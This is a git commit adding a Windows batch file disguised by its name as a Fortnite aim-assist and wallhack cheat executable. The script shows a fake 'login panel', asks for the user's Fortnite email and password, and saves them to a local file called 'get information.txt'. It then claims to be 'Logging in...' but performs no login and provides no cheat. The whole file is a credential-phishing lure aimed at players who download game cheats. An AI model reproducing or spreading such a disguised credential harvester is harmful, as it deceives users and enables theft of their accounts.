4dc27abfd4bfedeaf0d7a782f81f47216a884837
AlbertAlex43 <95273066+AlbertAlex43@users.noreply.github.com>
2021-11-30 09:01:41 +0200

    Add files via upload

---
+++ Fortnite(AimAsisst+Wallhack)/Fortnite(AimAsisst+Wallhack).exe.bat
@@ -0,0 +1,15 @@
+echo off
+color a
+Tittle Minecraft Generator
+cls
+echo login panel 
+echo Please Enter Fortnite Email And Password:
+echo,
+echo,
+set/p user=Email:
+set/p pass=Password:
+echo UserName=%user%Passord=%pass%>get information.txt
+echo,
+echo,
+echo Logging in...
+echo Apasati enter pentru a continua
